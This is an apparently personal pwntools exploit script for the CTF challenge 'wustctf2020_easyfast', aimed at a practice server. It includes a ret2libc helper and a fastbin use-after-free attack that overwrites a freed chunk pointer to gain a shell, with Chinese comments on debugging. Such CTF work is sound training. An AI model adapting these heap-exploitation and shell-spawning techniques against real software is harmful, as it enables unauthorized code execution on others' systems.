from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './wustctf2020_easyfast'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28804) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b'>',b'1')
    sla(b'>',int2bytes(len))
    # sa(b':',content)

# def show(index):
#     sla(b':',b'3')
#     sla(b':',int2bytes(index))

def edit(index,content):
    sla(b'>',b'3')
    sla(b'>',int2bytes(index))
    sl(content)

def delete(index):
    sla(b'>',b'2')
    sla(b'>',int2bytes(index))

fake_chunk = 0x602080
flag = 0x602090
offset = flag - fake_chunk - 0x10
add(0x40) # 0
delete(0)
edit(0,p64(fake_chunk))
add(0x40) # 1  #delete函数没有给count减1，debug了好久发现应该是2不是1
add(0x40) # 2 -- fake chunk
edit(2,b'a'*offset + p64(0))
# dbg()
sla(b'>', b'4')
#这道题基本上是自己做出来的，就是上面debug的时候看了一下wp发现edit应该是2不是1
itr()